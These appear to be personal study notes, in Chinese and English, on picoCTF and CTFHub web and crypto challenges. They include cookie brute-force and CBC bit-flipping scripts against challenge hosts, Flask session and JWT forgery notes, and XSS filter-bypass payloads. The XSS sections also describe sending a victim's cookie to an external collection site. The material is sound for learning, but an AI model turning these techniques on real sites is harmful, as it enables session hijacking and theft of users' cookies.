# Problems 



## picoctf 



### Inspect HTML

查看网页源代码

![image-20240420150805257](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240420150805257.png)





### Search source

打开google 开发者模式 ，选中 top ，右键选择 " 在所有文件中搜索 " ，输入 picoCTF 得到flag 。

![image-20240420151130418](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240420151130418.png)



or 将整个网站的文件下载到本地再用 grep 查询

![image-20240422115208725](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240422115208725.png)





![image-20240422120928485](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240422120928485.png)



![image-20240422120648121](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240422120648121.png)





### login

PicoCTF-Mini真题“login”
https://play.picoctf.org/practice/challenge/200?originalEvent=67&page=1&search=login





```js
(async()=>{
    await new Promise((e=>window.addEventListener("load", e))),
    document.querySelector("form").addEventListener("submit", (e=>{
        e.preventDefault();
        const r = {
            u: "input[name=username]",
            p: "input[name=password]"
        }
          , t = {};
        for (const e in r)
            t[e] = btoa(document.querySelector(r[e]).value).replace(/=/g, "");
        return "YWRtaW4" !== t.u ? alert("Incorrect Username") : "cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ" !== t.p ? alert("Incorrect Password") : void alert(`Correct Password! Your flag is ${atob(t.p)}.`)
    }
    ))
}
)();

```

**explanation**

- `btoa()`  : 对字符串进行base64编码 

- `.replace(/=/g, "")` 

  JavaScript RegExp `g` modifier

  - The `g` modifier specifies a global match. A global match finds all matches( not only the first match)

    Syntax :

    ```js
    new RegExp("regexp", "g")
    
    or simply:
    
    /regexp/g
    ```

  - common regular expression search methods

    - `text.match(pattern)`
    - `text.search(pattern)`
    - `pattern.exec(text)`
    - `pattern.test(text)`



### picobrowser

![image-20240425115652082](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240425115652082.png)



#### user-agent

其实简单的说User-Agent就是客户端浏览器等应用程序使用的一种特殊的网络协议，在每次浏览器（邮件客户端/搜索引擎蜘蛛）进行 HTTP 请求时发送到服务器，服务器就知道了用户是使用什么浏览器来访问的。既然是人为规定的协议，那么就是说不管什么浏览器，默认的UA都是可以更改的。

**Change user agent to solve the problem**

- use burpsuite
- write a python script using 内置的`urllib`模块或第三方库`request`











### Cookies

![image-20240428115821718](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428115821718.png)



#### burpsuite



- 初始状态， cookie header 还未设置， 可以看到 服务器端的 response header 设置 Set-Cookie `<cookie_name> = <cookie_value>` 

![image-20240428202600050](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202600050.png)



- browser 收到服务器端的 set-cookie header， 设置自己的 cookie 并发送 GET 请求

![image-20240428202724617](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202724617.png)



- 输入提示内容，发起 POST 请求 ，服务器端返回新的 cookie值

![image-20240428202517662](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202517662.png)

And the browser will be redirected to another page PATH /check



- 根据收到的新 cookie值 ， 重新发起  GET 请求

![image-20240428202833477](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202833477.png)



由上述分析可知，不同的输入值设置 服务器端的不同cookie值， 因此可以构造 GET 请求的 cookie ， 遍历破解( 可利用 intruder)



**设置 Payload type 为 Numbers**

![image-20240428204523055](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428204523055.png)



通过 settings->Grep-Match 过滤输出，( 需要注意的是 {} 需要转义 )

![image-20240428202227275](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428202227275.png)



**result**

![image-20240428204759863](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428204759863.png)





![image-20240428204910387](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428204910387.png)





#### python scripts

```python
import requests

for in range(50):
    cookie = 'name={}'.format(i)
    headers = {'Cookie':cookie}
    
    r = requests.get('http://mercury.picoctf.net:<port>/check', headers=headers) # note the path
    
    if(r.status_code==200 and ('picoCTF' in r.text)):
        print(r.text)
```





```
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```









### more cookies

```python
import requests

from base64 import b64decode
from base64 import b64encode

original_cookie = b64decode('aTM5MThRaTMwalAxTGwrcjRlVjZCZnkybGVzWXJtbmxENlVQOFE5ZlZxd3dpU1FWc3lTc0hxWjZjOXhJY1JqSW1GRlZnK0pOTlV3clBSNWx0bmp1T2JDclgvMFZTb1ducHJESzBacURDblUxVTAxYmUyem9TYWJINzd4SWJjNkQ=')
original_cookie = bytearray(original_cookie)

def bitFlip(cookie_char_pos: int, bit_pos: int) -> str:
    altered_cookie = bytearray(original_cookie)

    flipped = altered_cookie[cookie_char_pos] ^ bit_pos

    altered_cookie[cookie_char_pos] = flipped
    altered_cookie_b64 = b64encode(altered_cookie)

    return altered_cookie_b64.decode("utf-8")



for cookie_char_pos in range(len(original_cookie)):
    print(f"checking cookie position {cookie_char_pos}")
    for bit_pos in range(128):
        altered_cookie = bitFlip(cookie_char_pos, bit_pos)
        cookies = {'authname':altered_cookie}
        r = requests.get("http://mercury.picoctf.net:21553/", cookies=cookies)
        if("picoCTF{" in r.text):
            print(r.text)
```





![image-20240501223533656](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240501223533656.png)



#### base64 module

This module provides functions for encoding binary data to printable ASCII characters and decoding such encodings back to binary data. It provides encoding and decoding functions for the encodings specified in [**RFC 4648**](https://datatracker.ietf.org/doc/html/rfc4648.html), which defines the Base16, Base32, and Base64 algorithms



There are two interfaces provided by this module. The modern interface supports encoding [bytes-like objects](https://docs.python.org/3/glossary.html#term-bytes-like-object) to ASCII [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes), and decoding [bytes-like objects](https://docs.python.org/3/glossary.html#term-bytes-like-object) or strings containing ASCII to [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes)



**`bytes-like object`**

An object that supports the [Buffer Protocol](https://docs.python.org/3/c-api/buffer.html#bufferobjects) and can export a C-[contiguous](https://docs.python.org/3/glossary.html#term-contiguous) buffer. This includes all [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes), [`bytearray`](https://docs.python.org/3/library/stdtypes.html#bytearray), and [`array.array`](https://docs.python.org/3/library/array.html#array.array) objects, as well as many common [`memoryview`](https://docs.python.org/3/library/stdtypes.html#memoryview) objects. Bytes-like objects can be used for various operations that work with binary data; these include compression, saving to a binary file, and sending over a socket.





**`base64.base64encode(s, altchars=None)`**

Encode the [bytes-like object](https://docs.python.org/3/glossary.html#term-bytes-like-object) *s* using Base64 and return the encoded [`bytes`](https://docs.python.org/3/library/stdtypes.html#bytes).

Optional *altchars* must be a [bytes-like object](https://docs.python.org/3/glossary.html#term-bytes-like-object) of length 2 which specifies an alternative alphabet for the `+` and `/` characters. This allows an application to e.g. generate URL or filesystem safe Base64 strings. The default is `None`, for which the standard Base64 alphabet is used.





**`base64.b64decode(s, altchars=None, validate=False)`**

Decode the Base64 encoded bytes-like object or ASCII string *s* and return the decoded bytes





#### Block cipher mode of operation

A block cipher processes the data blocks of fixed size. Usually, the size of a message is larger than the block size. Hence, the long message is divided into a series of sequential message blocks, and the cipher operates on these blocks one at a time. There are five Block Cipher Modes Of Operations which are listed below.



**Electronic Code Book (ECB) **

ECB is the easiest block cipher mode of functioning, because of direct encryption of each block of input plaintext and output is in form of blocks of encrypted ciphertext. Generally, if a message is larger than the block size lets say b bits, it can be broken down into a bunch of blocks and the procedure is repeated further until the last block.  Decryption is the reverse process by using decryption algorithm as it is shown clearly in the image below.

![No alt text provided for this image](https://media.licdn.com/dms/image/C4D12AQE3dzHZscGDAg/article-inline_image-shrink_400_744/0/1638027715046?e=2147483647&v=beta&t=jju7xlUEKXMH42TmCa4sMqTIkdCQ461a2hLuevGJJJ8)



**Cipher Block Chaining (CBC)** 

CBC is the advancement mode of ECB since ECB compromises some security requirements like there is a direct connection between the cipher text and the plain text which makes it easier for the attackers to decrypt the encoded message. In CBC, connection between the plain text and cipher text is broken down by providing the previous cipher block as input to the next encryption algorithm after XOR with the original plaintext block. As there is no previous blocks are available for the first block, use a Initial Vector(IV) and continue the process.

![No alt text provided for this image](https://media.licdn.com/dms/image/C4D12AQHYjanwLKunBg/article-inline_image-shrink_1000_1488/0/1637835613988?e=2147483647&v=beta&t=p9LMivGtfwzcL5KCy5ZlMdLGhgsIliAZxWlvOhMvXGs)



**Cipher Feedback Mode (CFB) ** 

The cipher is given as feedback to the next block of encryption in this mode. First, an initial vector IV is used for first encryption and output bits are divided as a set of *s* and *b-s* bits. The left-hand side *s* bits are selected and are applied an XOR operation with plaintext bits. The result is given as input to a shift register and the process continues. Both encryption and decryption processes use the same encryption algorithm. 

![No alt text provided for this image](https://media.licdn.com/dms/image/C4D12AQH1p_FF0u0YFw/article-inline_image-shrink_1000_1488/0/1637835643119?e=2147483647&v=beta&t=jpoZlleNdy7n3iL_O6xGfrq13o-XCGe2guBcaDWdFo0)





The OFB follows nearly the same process as the CFB except that it sends the encrypted output as feedback instead of the actual cipher which is XOR output. In this output feedback mode, all bits of the block are sent instead of sending selected *s* bits. The OFB of block cipher holds great resistance towards bit transmission errors. It also decreases the dependency or relationship of the cipher on the plaintext. 

![No alt text provided for this image](https://media.licdn.com/dms/image/C4D12AQGNBb6E-MN2GA/article-inline_image-shrink_1000_1488/0/1637835678680?e=2147483647&v=beta&t=NjxNd7h8bm67uyw9UMADIrH7VNTC51BlGxI5UHPLxGk)

**Counter Mode (CTR)  

The CTR is a simple counter-based block cipher implementation. Every time a counter-initiated value is encrypted and given as input to XOR with plaintext which results in ciphertext block. The CTR mode is independent of feedback use and thus can be implemented in parallel. Fastest mode compared to CBC, CFB and OFB due to parallel execution while in the mentioned modes each block is dependent on the previous blocks.

![No alt text provided for this image](https://media.licdn.com/dms/image/C4D12AQE5h0GYHBhWCA/article-inline_image-shrink_1000_1488/0/1637835706199?e=2147483647&v=beta&t=6Ol662q_Zzdzt9O7UiVczIsUiB0bWQdPydlDPECvSsw)

**Note:**

Only ECB and CBC use decryption algorithm for decrypting the cipher text. Remaining three uses same encryption algorithm for both encryption and decryption.









https://zhangzeyu2001.medium.com/attacking-cbc-mode-bit-flipping-7e0a1c185511

https://www.youtube.com/watch?v=QG-z0r9afIs



#### Bit Flipping: Attack on CBC Mode



```python
import socketserver 
import socket, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from Crypto.Random import get_random_bytes
from binascii import unhexlify

flag = open('flag','r').read().strip()

def encrypt_data(data,key,iv):
    padded = pad(data.encode(),16,style='pkcs7')
    cipher = AES.new(key, AES.MODE_CBC,iv)
    enc = cipher.encrypt(padded)
    return enc.hex()

def decrypt_data(encryptedParams,key,iv):
    cipher = AES.new(key, AES.MODE_CBC,iv)
    paddedParams = cipher.decrypt( unhexlify(encryptedParams))
    if b'admin&password=sUp3rPaSs1' in unpad(paddedParams,16,style='pkcs7'):
        return 1
    else:
        return 0

def send_message(server, message):
    enc = message.encode()
    server.send(enc)

def setup(server,username,password,key,iv):
        message = 'access_username=' + username +'&password=' + password
        send_message(server, "Leaked ciphertext: " + encrypt_data(message,key,iv)+'\n')
        send_message(server,"enter ciphertext: ")

        enc_message = server.recv(4096).decode().strip()

        try:
                check = decrypt_data(enc_message,key,iv)
        except Exception as e:
                send_message(server, str(e) + '\n')
                server.close()

        if check:
                send_message(server, 'No way! You got it!\nA nice flag for you: '+ flag)
                server.close()
        else:
                send_message(server, 'Flip off!')
                server.close()

def start(server):
        key = get_random_bytes(16)
        iv = get_random_bytes(16)
        send_message(server, 'Welcome! Please login as the admin!\n')
        send_message(server, 'username: ')
        username = server.recv(4096).decode().strip()

        send_message(server, username +"'s password: ")
        password = server.recv(4096).decode().strip()

        message = 'access_username=' + username +'&password=' + password

        if "admin&password=sUp3rPaSs1" in message:
            send_message(server, 'Not that easy :)\nGoodbye!\n')
        else:
            setup(server,username,password,key,iv)

class RequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        start(self.request)

if __name__ == '__main__':
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    server = socketserver.ThreadingTCPServer(('0.0.0.0', 1337), RequestHandler)
    server.serve_forever()
```



**package Crypto** : No module named Crypto 

https://stackoverflow.com/questions/19623267/importerror-no-module-named-crypto-cipher

![image-20240430201121756](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240430201121756.png)



![image-20240501092707366](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240501092707366.png)

![image-20240501101128048](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240501101128048.png)

the block length is 16 , so 7 bytes will be padded.

Block 1: `access_username=`
Block 2: `admin&password=s`
Block 3: `Up3rPaSs1$$$$$$$`



```
b9e59bbe2b4062e5917816b0b74d78e72bb3c73b8e71854989591baf54f8146be04d9d755fead367d02e4a695ebf2cf3
```



c1 = `b9e59bbe2b4062e5917816b0b74d78e7`

c2 = `2bb3c73b8e71854989591baf54f8146b`

c3 = `e04d9d755fead367d02e4a695ebf2cf3`



`c1_0 ^ dec(c2_0)` =`p2_0`

to make `c1_0'`^ `dec(c2_0)` =` p2_0'`

->  `c1_0'` = `p2_0' ^ c1_0 ^ p2_0`



take into the value:

`c1_0'` = `a ^ c1_0 ^ b`  of course you can change any bit in the second cipher text block ,  just change the first bit for convenience.



- the key is generated randomly every time, so we can't access the value of key
- Note that we choose to change the second plain text block instead of the third one.  Because the change of the cipher text will affect the plain text. So if we modify the second cipher block ( to generate the desired result in third plain text block ) , the second plain text will be changed as well. But as we can see, the first plain text block is not important, we don't actually care about it.
- When we knows the structure of the plain text and cypher text, the decrypted text can be controlled.



we can also write a script to solve the problem

```python
msg = 'access_username=admin&password=sUp3rPaSs1'
print(msg, len(msg))
xor = ord('r') ^ ord('s')
cipher = encrypt_data(msg) # this function will pad characters automatically.
cipher = cipher[:16] + hex(int(cipher[16:18], 16) ^ xor)[2:] + cipher[18:]
print(decrypt_data(cipher))
```



- `int(string, 16)` 是Python中将十六进制字符串转换为整数的方法。它将给定的字符串解释为十六进制数，并返回对应的整数值。例如：

  ```python
  hex_string = "1A"
  decimal_value = int(hex_string, 16)
  print(decimal_value)  # 26
  ```











### most cookies

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"] # session can't be set at the client side
		return resp # directe to /display
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin": # you have to make the form value 'name' : admin .
 			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()


```



#### Analyses

![image-20240502162729476](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502162729476.png)

`Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZjNN3Q.lqfJRkuoI7Ft-lLLZ36o2T_49v0; HttpOnly; Path=/`



![image-20240502162826226](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502162826226.png)







![image-20240502162858473](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502162858473.png)

`Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZjNOCw.qVeZgYMaE2Wox_sEyFvfezvZrz8; HttpOnly; Path=/`



![image-20240502162923501](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502162923501.png)

`Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.ZjNODA.V6DStg3v2e5BZ5ZpVnkalZNDLUs; HttpOnly; Path=/`



由session中的 `.` 联想到 JWT 结构

![image-20240502193317048](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502193317048.png)

So the target is to change the `very_auth` and accordingly, change the signature since the secret_key is known( brute force )



#### 参考

https://medium.com/@MohammedAl-Rasheed/picoctf-2021-most-cookies-7f3d8b6cd0b

https://tedboy.github.io/flask/interface_api.session_interface.html

https://ctf.zeyu2001.com/2021/picoctf/most-cookies-150

https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe





![image-20240502200254243](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502200254243.png)

![image-20240502201339028](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502201339028.png)

![image-20240502201321269](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502201321269.png)

![image-20240503204416467](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240503204416467.png)

![image-20240502202757928](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502202757928.png)













#### JWT

**JSON Web Token**is a proposed Internet standard for creating data with optional signature and/or optional encryptionwhose payload holds [JSON](https://en.wikipedia.org/wiki/JSON) that asserts some number of claims. The tokens are signed either using a private secret or a public/private key.

For example, a server could generate a token that has the claim "logged in as administrator" and provide that to a client. The client could then use that token to prove that it is logged in as admin. The tokens can be signed by one party's private key (usually the server's) so that any party can subsequently verify whether the token is legitimate.



##### Structure

JWT 本质上就是一组字串，通过（`.`）切分成三个为 Base64 编码的部分



1. **Header**

Identifies which algorithm is used to generate the signature

Typical cryptographic algorithms used are [HMAC](https://en.wikipedia.org/wiki/HMAC) with [SHA-256](https://en.wikipedia.org/wiki/SHA-256) (HS256) and [RSA signature](https://en.wikipedia.org/wiki/Digital_signature) with SHA-256 (RS256). JWA (JSON Web Algorithms) RFC 7518 introduces many more for both authentication and encryption

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- `typ`（Type）：令牌类型，也就是 JWT。
- `alg`（Algorithm）：签名算法





2. **Payload**

JSON 格式数据，其中包含了 Claims(声明，包含 JWT 的相关信息)。

Claims 分为三种类型：

- **Registered Claims（注册声明）**：预定义的一些声明，建议使用，但不是强制性的。
- **Public Claims（公有声明）**：JWT 签发方可以自定义的声明，但是为了避免冲突，应该在 [IANA JSON Web Token Registryopen in new window](https://www.iana.org/assignments/jwt/jwt.xhtml) 中定义它们。
- **Private Claims（私有声明）**：JWT 签发方因为项目需要而自定义的声明，更符合实际项目场景使用。

下面是一些常见的注册声明：

- `iss`（issuer）：JWT 签发方。
- `iat`（issued at time）：JWT 签发时间。
- `sub`（subject）：JWT 主题。
- `aud`（audience）：JWT 接收方。
- `exp`（expiration time）：JWT 的过期时间。
- `nbf`（not before time）：JWT 生效时间，早于该定义的时间的 JWT 不能被接受处理。
- `jti`（JWT ID）：JWT 唯一标识。

Payload 部分默认是不加密的，**一定不要将隐私信息存放在 Payload 当中！！！**

example:

```
{
  "uid": "ff1212f5-d8d1-4496-bf41-d2dda73de19a",
  "sub": "1234567890",
  "name": "John Doe",
  "exp": 15323232,
  "iat": 1516239022,
  "scope": ["admin", "user"]
}
```





- **Signature**

Signature 部分是对前两部分的签名，作用是防止 JWT（主要是 payload） 被篡改。

这个签名的生成需要用到：

- Header + Payload。

- 存放在服务端的密钥(一定不要泄露出去)。

- 签名算法

  

签名的计算公式 ：

```plain
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用"点"（`.`）分隔，这个字符串就是 JWT 。





##### Base64URL

Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。

JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com/?token=xxx）。Base64 有三个字符`+`、`/`和`=`，在 URL 里面有特殊含义，所以要被替换掉：`=`被省略、`+`替换成`-`，`/`替换成`_` 。这就是 Base64URL 算法。

- `base64.standard_b64decode(s)`

  Decode bytes-like object or ASCII string *s* using the standard Base64 alphabet and return the decoded bytes

- `base64.urlsafe_b64encode(s)`

  Encode bytes-like objects using the URL- and filesystem-safe alphabet, which substitutes `-` instead of `+` and `_` instead of `/` in the standard Base64 alphabet, and return the encoded bytes. The result can still contain` =`.

![image-20240502193128066](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502193128066.png)

3 `=` is always a safe padding.





##### Practices

https://www.youtube.com/watch?v=mhcnBTDLxCI

https://blog.miguelgrinberg.com/post/how-secure-is-the-flask-user-session



The application is in file `guess.py`:

```
import os
import random
from flask import Flask, session, redirect, url_for, request, render_template

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY') or \
    'e5ac358c-f0bf-11e5-9e39-d3b532c10a28'

@app.route('/')
def index():
    # the "answer" value cannot be stored in the user session as done below
    # since the session is sent to the client in a cookie that is not encrypted!
    session['answer'] = random.randint(1, 10)
    session['try_number'] = 1
    return redirect(url_for('guess'))

@app.route('/guess')
def guess():
    guess = int(request.args['guess']) if 'guess' in request.args else None
    if request.args.get('guess'):
        if guess == session['answer']:
            return render_template('win.html')
        else:
            session['try_number'] += 1
            if session['try_number'] > 3:
                return render_template('lose.html', guess=guess)
    return render_template('guess.html', try_number=session['try_number'],
                           guess=guess)

if __name__ == '__main__':
    app.run()
```

There are also three template files that you will need to store in a `templates` subdirectory. Template number one is called `guess.html`:

```
<html>
    <head>
        <title>Guess the number!</title>
    </head>
    <body>
        <h1>Guess the number!</h1>
        {% if try_number == 1 %}
        <p>I thought of a number from 1 to 10. Can you guess it?</p>
        {% else %}
        <p>Sorry, {{ guess }} is incorrect. Try again!</p>
        {% endif %}
        <form action="">
            Try #{{ try_number }}: <input type="text" name="guess">
            <input type="submit">
        </form>
    </body>
</html>
```

Template number two is `win.html`:

```
<html>
    <head>
        <title>Guess the number: You win!</title>
    </head>
    <body>
        <h1>Guess the number!</h1>
        <p>Congratulations, {{ session['answer'] }} is the correct number.</p>
        <p><a href="{{ url_for('index') }}">Play again</a></p>
    </body>
</html>
```

And the last template is `lose.html`:

```
<html>
    <head>
        <title>Guess the number: You lose!</title>
    </head>
    <body>
        <h1>Guess the number!</h1>
        <p>Sorry, {{ guess }} is incorrect. My guess was {{ session['answer'] }}.</p>
        <p><a href="{{ url_for('index') }}">Play again</a></p>
    </body>
</html>
```





### client-side-again

js obfusacation

![image-20240504142110129](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504142110129.png)

picoCTF{not_this_again_50a029}

#### js obfuscation



Codes written in many languages are published and executed without being compiled in interpreted languages, such as Python,PHP, and JavaScript. While Python and PHP usually reside on the server-side and hence are hidden from end-users, JavaScript is usually used within browsers at the client-side, and the code is sent to the user and executed in cleartext. This is why obfuscation is very often used with JavaScript.

*It must be noted that doing authentication or encryption on the client-side is not recommended, as code is more prone to attacks this way.*

- concealing data is just one of several dimensions of JS obfuscation. Strong obfuscation will also **obfuscate the layout and program control flow**, as well as include several **optimization** techniques. Typically, it will target:
  - Identifiers;
  - Booleans;
  - Functions;
  - Numbers;
  - Predicates;
  - Regular expressions;
  - Statements; and
  - Program control flow.



##### obfuscation technique



`console.log("Hello, world! " + 123);`



**Hexadecimal** string encoding

Each ASCII character of the hardcoded string was converted into hexadecimal form

There’s also another variation of this technique that involves replacing characters with their unicode encoding.

`console["\x6C\x6F\x67"]("\x48\x65\x6C\x6C\x6F\x2C\x20\x77\x6F\x72\x6C\x64\x21\x20"+ 123)`



**String Array Mapping**

`var _0x8b75=["Hello, world! ","log"];console[_0x8b75[1]](_0x8b75[0]+ 123)`



**Dead code injection**





### 13



**rot-13**

ROT13 (Rotate13) is a simple letter substitution cipher that replaces a letter with the 13th letter after it in the Latin alphabet. ROT13 is a special case of the Caesar cipher 

![img](https://upload.wikimedia.org/wikipedia/commons/thumb/3/33/ROT13_table_with_example.svg/220px-ROT13_table_with_example.svg.png)

Because there are 26 letters (2×13) in the basic Latin alphabet, ROT13 is its own inverse; that is, to undo ROT13, the same algorithm is applied, so the same action can be used for encoding and decoding. The algorithm provides virtually no cryptographic security, and is often cited as a canonical example of weak encryption.

![image-20240504151833679](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504151833679.png)

![image-20240504151812374](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504151812374.png)































## ctfhub



### HTTP 基本认证



#### 方法一： python 脚本

![image-20240504113140848](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504113140848.png)

![image-20240504113158854](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504113158854.png)



#### 方法二 ：burpsuite

![image-20240504114333952](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504114333952.png)

![image-20240504114234643](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504114234643.png)

![image-20240504114303419](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504114303419.png)







### xss



#### 反射型



**actor ：**

我作为攻击者，目标是获取另一个用户的Cookie，因此在第一个输入框内 `<script>alert(document.cookie)</script>` 是无意义的 。但通过对此输入框的测试 `<h1>Test xss</h1>` 可以得出此输入框是一个 xss 攻击点， 可在此处构造 payload 获取敏感信息。

正常情况下我需要获取另一个用户在此网站的cookie( victim ) , 但作为一个测试环境，没有这个用户存在，因此将此 URL 发送给后台 bot，bot 模拟victim 点击行为，执行script脚本内容( src="..." ) ,  将会加载此网页 ，发送请求到 xss platform 地址，request 会包含victim在此网站的cookie和相关信息，被 xss platform 记录

xss platform 网址 ：https://xssaq.com/

**bot**

*A bot, short for robot, is an automated program that performs tasks on the internet. Bots can be simple, like those that crawl web pages for search engines, or complex, like AI chatbots that engage in conversations with users.*



![image-20240505151746029](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505151746029.png)

![image-20240505151306027](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505151306027.png)









#### 过滤空格

尝试`<script type="text/javascript">alert(1)</script>`， 

发现空格被过滤 `http://challenge5798073c7e365102.sandbox.ctfhub.com:10800/name=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%281%29%3C%2Fscript%3E`

- HTML实体编码： `&nbsp;` , `&#32;`
- URL编码：`%20`
- Unicode编码：`\u0020`
- ![image-20240505161152530](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505161152530.png)

![image-20240505160546070](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505160546070.png)







#### xss 关键词过滤

尝试 `<script>alert(1)</script>`

![image-20240505164644699](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164644699.png)

 将 s 改为 S 成功。



![image-20240505164906653](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164906653.png)

![image-20240505164854180](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164854180.png)







#### 存储型

存储型是将恶意代码存储在 server端， victim 访问该受损网站时加载恶意代码，从而敏感信息泄露。



首先 post 恶意代码到server端

![image-20240505163952400](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505163952400.png)



现在此网站受损，访问此网站的用户都会加载恶意代码， 向 src 地址发送 request ，暴露此用户在此网站的cookie



然后bot模拟用户点击行为，访问此网站，加载恶意代码。

![image-20240505164144914](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164144914.png)



![image-20240505164315090](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505164315090.png)







#### DOM 反射

![image-20240505184508085](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505184508085.png)



